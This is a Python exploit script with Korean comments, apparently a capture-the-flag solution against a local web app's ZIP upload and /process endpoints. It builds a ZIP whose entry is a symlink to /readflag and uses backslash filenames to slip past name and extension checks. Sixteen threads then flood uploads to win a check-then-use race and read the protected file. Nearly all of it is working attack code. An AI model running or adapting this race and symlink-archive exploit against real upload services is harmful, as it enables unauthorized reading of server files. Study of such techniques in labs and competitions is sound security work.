import requests
import io
import zipfile
import threading
import time
from typing import Tuple

# ====== 설정 ======
BASE = "http://localhost:3000"
VERIFY_TLS = True          # 인증서 문제 있으면 False (테스트 전용)
NAME  = "xxx\\"                 # /process 필터 우회: 길이 1
ENTRY = "xxx\\"                # 확장자 검사 우회: 길이 1
SYMLINK_TARGET = "/readflag"   # 필요시 "/readflag" 로 변경

# 레이스 설정
NUM_THREADS = 16           # 업로드 폭격 스레드 수
DURATION_SEC = 2.2         # 각 스레드 업로드 지속 시간 (setTimeout 1s 여유 포함)
INTERVAL_SEC = 0.015       # 업로드 간격(짧을수록 더 많은 요청)
START_DELAY = 0.22         # /process 호출 후 레이스 시작 지연(검증→setTimeout 구간 진입 타이밍 추정)

# ====== ZIP 생성 ======
def build_safe_zip_bytes() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(ENTRY, b"SAFE\n")
    return buf.getvalue()

def build_symlink_zip_bytes(link_name=ENTRY, target=SYMLINK_TARGET) -> bytes:
    zi = zipfile.ZipInfo(link_name)
    zi.create_system = 3                # Unix
    zi.external_attr = (0o120777 << 16) # S_IFLNK | 0777 (상위 16비트)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(zi, target)        # symlink 타겟을 파일 데이터로
    return buf.getvalue()

# ====== HTTP 유틸 ======
def upload_zip(session: requests.Session, zip_bytes: bytes, save_name: str = NAME, filename: str = "m.zip") -> None:
    url = BASE.rstrip("/") + "/upload"
    files = {"file": (filename, io.BytesIO(zip_bytes), "application/zip")}
    data = {"name": save_name}
    r = session.post(url, data=data, files=files, timeout=10, verify=VERIFY_TLS)
    r.raise_for_status()

def trigger_process() -> Tuple[int, str]:
    url = BASE.rstrip("/") + "/process"
    r = requests.get(url, params={"name[]": NAME, "file[]": ENTRY}, timeout=25, verify=VERIFY_TLS)
    return r.status_code, r.text

# ====== 레이스 워커 ======
def race_worker(tid: int, barrier: threading.Barrier, mal_zip: bytes, stats: dict):
    # 스레드별 세션
    s = requests.Session()
    # 동시에 출발
    barrier.wait()
    end = time.time() + DURATION_SEC
    ok = 0
    while time.time() < end:
        try:
            upload_zip(s, mal_zip, save_name=NAME, filename=f"m{tid}.zip")
            ok += 1
        except Exception:
            pass
        time.sleep(INTERVAL_SEC)
    stats[tid] = ok

def main():
    safe = build_safe_zip_bytes()
    mal = build_symlink_zip_bytes()

    # 0) SAFE ZIP 선업로드(사전 검증 통과용)
    print("[*] Uploading SAFE zip as name='a'...")
    with requests.Session() as s:
        upload_zip(s, safe, save_name=NAME, filename="safe.zip")
    print("[*] SAFE uploaded.")

    # 1) 레이스 스레드 준비 (동시 출발용 Barrier)
    barrier = threading.Barrier(NUM_THREADS + 1)
    stats = {}
    threads = [
        threading.Thread(target=race_worker, args=(i, barrier, mal, stats), daemon=True)
        for i in range(NUM_THREADS)
    ]
    for t in threads:
        t.start()

    # 2) /process 트리거 직후, START_DELAY 만큼 기다렸다가 레이스 시작 신호
    print("[*] Triggering /process and arming racers ...")
    proc_result = {}
    def call_process():
        st, body = trigger_process()
        proc_result["status"] = st
        proc_result["body"] = body

    proc_thread = threading.Thread(target=call_process, daemon=True)
    proc_thread.start()

    time.sleep(START_DELAY)  # 검증→setTimeout(1s) 구간을 노린 타이밍
    print("[*] GO! racers uploading malicious zips ...")
    barrier.wait()  # 모든 worker에게 동시에 출발 신호

    # 3) /process 완료 대기 + 레이스 종료 대기
    proc_thread.join()
    for t in threads:
        t.join()

    # 4) 결과 출력
    total_ok = sum(stats.values())
    print(f"[*] racers uploaded OK count: {total_ok} (threads={NUM_THREADS})")
    st = proc_result.get("status", -1)
    body = proc_result.get("body", "")
    print(f"[+] /process status: {st}")
    print("----- response body (first 2KB) -----")
    with open("demofile", "wb") as f:
        f.write(body.encode('utf-8'))
    print(body[:2048])
    print("-------------------------------------")

if __name__ == "__main__":
    main()